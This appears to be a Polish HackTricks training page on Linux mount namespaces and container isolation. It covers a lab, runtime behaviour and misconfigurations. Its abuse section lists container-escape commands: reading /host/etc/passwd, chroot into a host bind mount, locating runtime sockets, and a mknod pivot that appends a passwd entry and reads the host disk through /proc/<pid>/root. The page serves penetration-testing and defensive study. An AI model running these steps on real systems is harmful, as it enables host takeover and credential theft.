# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Przegląd

Mount namespace kontroluje **tabelę montowań** widoczną dla procesu. Jest to jedna z najważniejszych funkcji izolacji kontenerów, ponieważ główny system plików, bind mounts, montowania tmpfs, widok procfs, udostępnienie sysfs oraz wiele pomocniczych montowań specyficznych dla runtime są reprezentowane właśnie w tej tabeli montowań. Dwa procesy mogą mieć dostęp do `/`, `/proc`, `/sys` lub `/tmp`, ale to, do czego te ścieżki się odwołują, zależy od mount namespace, w którym się znajdują.

Z perspektywy bezpieczeństwa kontenerów mount namespace często decyduje o tym, czy „jest to starannie przygotowany system plików aplikacji”, czy „ten proces może bezpośrednio widzieć system plików hosta lub na niego wpływać”. Dlatego bind mounts, wolumeny `hostPath`, uprzywilejowane operacje montowania oraz zapisywalne udostępnienia `/proc` lub `/sys` są ściśle związane z tą przestrzenią nazw.

## Działanie

Gdy runtime uruchamia kontener, zazwyczaj tworzy nowy mount namespace, przygotowuje główny system plików kontenera, montuje procfs i inne pomocnicze systemy plików w razie potrzeby, a następnie opcjonalnie dodaje bind mounts, montowania tmpfs, secrets, config maps lub host paths. Gdy proces działa już wewnątrz tej przestrzeni nazw, zestaw widocznych przez niego montowań jest w dużej mierze niezależny od domyślnego widoku hosta. Host nadal może widzieć rzeczywisty bazowy system plików, ale kontener widzi jego wersję złożoną dla niego przez runtime.

Jest to potężne rozwiązanie, ponieważ pozwala kontenerowi sądzić, że posiada własny główny system plików, mimo że host nadal wszystkim zarządza. Jest to również niebezpieczne, ponieważ jeśli runtime udostępni niewłaściwe montowanie, proces nagle uzyska wgląd w zasoby hosta, których pozostałe elementy modelu bezpieczeństwa mogły nie być zaprojektowane w celu ochrony.

## Lab

Możesz utworzyć prywatny mount namespace za pomocą:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
Jeśli otworzysz inną powłokę poza tą przestrzenią nazw i sprawdzisz tablicę montowań, zobaczysz, że montowanie tmpfs istnieje wyłącznie wewnątrz odizolowanej mount namespace. To przydatne ćwiczenie, ponieważ pokazuje, że izolacja montowań nie jest abstrakcyjną teorią; kernel dosłownie prezentuje procesowi inną tablicę montowań.

Jeśli otworzysz inną powłokę poza tą przestrzenią nazw i sprawdzisz tablicę montowań, montowanie tmpfs będzie istnieć wyłącznie wewnątrz odizolowanej mount namespace.

W kontenerach szybkie porównanie wygląda następująco:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Drugi przykład pokazuje, jak łatwo konfiguracja runtime'u może utworzyć ogromną lukę w granicy systemu plików.

## Użycie runtime'u

Docker, Podman, stacki oparte na containerd oraz CRI-O korzystają z prywatnej przestrzeni nazw montowania dla zwykłych kontenerów. Kubernetes opiera się na tym samym mechanizmie w przypadku wolumenów, projected secrets, config maps oraz mountów `hostPath`. Środowiska Incus/LXC również w dużym stopniu korzystają z przestrzeni nazw montowania, szczególnie dlatego, że kontenery systemowe często udostępniają bogatsze i bardziej przypominające system rzeczywisty systemy plików niż kontenery aplikacyjne.

Oznacza to, że podczas analizowania problemu z systemem plików kontenera zwykle nie masz do czynienia z odosobnionym problemem Dockera. Jest to problem dotyczący przestrzeni nazw montowania i konfiguracji runtime'u, ujawniający się za pośrednictwem platformy, która uruchomiła workload.

## Błędne konfiguracje

Najbardziej oczywistym i niebezpiecznym błędem jest udostępnienie głównego systemu plików hosta lub innej wrażliwej ścieżki hosta za pomocą bind mountu, na przykład `-v /:/host`, albo użycie zapisywalnego `hostPath` w Kubernetes. W tym momencie pytanie nie brzmi już: „czy kontener może w jakiś sposób dokonać escape?”, lecz raczej: „ile użytecznych danych hosta jest już bezpośrednio widocznych i możliwych do modyfikacji?”. Zapisywalny bind mount hosta często zmienia resztę exploita w prostą kwestię umieszczenia pliku, użycia chroota, modyfikacji konfiguracji lub znalezienia socketu runtime'u.

Innym częstym problemem jest udostępnianie hostowego `/proc` lub `/sys` w sposób omijający bezpieczniejszy widok kontenera. Te systemy plików nie są zwykłymi mountami danych — stanowią interfejsy do stanu kernela i procesów. Jeśli workload uzyska bezpośredni dostęp do ich wersji hosta, wiele założeń, na których opiera się hardening kontenera, przestaje mieć zastosowanie.

Znaczenie mają również zabezpieczenia tylko do odczytu. System plików root tylko do odczytu nie zabezpiecza kontenera w magiczny sposób, ale usuwa dużą część przestrzeni roboczej atakującego i utrudnia persistence, umieszczanie helper-binary oraz manipulowanie konfiguracją. Z kolei zapisywalny root lub zapisywalny bind mount hosta daje atakującemu miejsce na przygotowanie kolejnego kroku.

## Nadużycie

Gdy przestrzeń nazw montowania jest używana niewłaściwie, atakujący zazwyczaj robią jedną z czterech rzeczy. **Odczytują dane hosta**, które powinny pozostać poza kontenerem. **Modyfikują konfigurację hosta** za pośrednictwem zapisywalnych bind mountów. **Montują lub ponownie montują dodatkowe zasoby**, jeśli capabilities i seccomp na to pozwalają. Albo **uzyskują dostęp do uprzywilejowanych socketów i katalogów ze stanem runtime'u**, które pozwalają im poprosić samą platformę kontenerową o większy poziom dostępu.

Jeśli kontener już widzi system plików hosta, cały model bezpieczeństwa natychmiast się zmienia.

Gdy podejrzewasz bind mount hosta, najpierw sprawdź, co jest dostępne i czy można to modyfikować:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
Jeśli główny system plików hosta jest zamontowany w trybie odczytu i zapisu, bezpośredni dostęp do hosta często sprowadza się do:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
Jeśli celem jest uprzywilejowany dostęp do runtime zamiast bezpośredniego użycia chroot, wylicz gniazda i stan runtime:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
Jeśli obecne jest `CAP_SYS_ADMIN`, sprawdź również, czy wewnątrz kontenera można tworzyć nowe montowania:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Pełny przykład: pivot `mknod` z użyciem dwóch powłok

Bardziej wyspecjalizowana ścieżka nadużycia pojawia się, gdy użytkownik root kontenera może tworzyć urządzenia blokowe, host i kontener współdzielą tożsamość użytkownika w użyteczny sposób, a atakujący ma już foothold o niskich uprawnieniach na hoście. W takiej sytuacji kontener może utworzyć węzeł urządzenia, taki jak `/dev/sda`, a użytkownik hosta o niskich uprawnieniach może później odczytać go za pośrednictwem `/proc/<pid>/root/` dla odpowiadającego procesu kontenera.

Wewnątrz kontenera:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Z hosta, jako odpowiadający mu użytkownik o niskich uprawnieniach, po zlokalizowaniu PID procesu powłoki kontenera:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Ważna lekcja nie dotyczy dokładnego wyszukiwania ciągu CTF. Chodzi o to, że dostęp do mount namespace za pośrednictwem `/proc/<pid>/root/` może pozwolić użytkownikowi hosta ponownie wykorzystać węzły urządzeń utworzone przez kontener, nawet gdy device policy cgroup uniemożliwiała ich bezpośrednie użycie wewnątrz samego kontenera.

## Sprawdzenia

Te polecenia mają pokazać widok systemu plików, w którym faktycznie działa bieżący proces. Celem jest wykrycie mountów pochodzących z hosta, zapisywalnych wrażliwych ścieżek oraz wszystkiego, co wygląda na szersze niż normalny główny system plików kontenera aplikacji.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Co jest tutaj interesujące:

- Bind mounts z hosta, szczególnie `/`, `/proc`, `/sys`, katalogi stanu runtime lub lokalizacje socketów, powinny od razu zwrócić uwagę.
- Nieoczekiwane montowania read-write są zwykle ważniejsze niż duża liczba pomocniczych montowań read-only.
- `mountinfo` jest często najlepszym miejscem do sprawdzenia, czy ścieżka rzeczywiście pochodzi z hosta, czy jest wspierana przez overlay.

Te kontrole pozwalają ustalić, **które zasoby są widoczne w tej przestrzeni nazw**, **które z nich pochodzą z hosta** oraz **które są zapisywalne lub wrażliwe z punktu widzenia bezpieczeństwa**.
{{#include ../../../../../banners/hacktricks-training.md}}
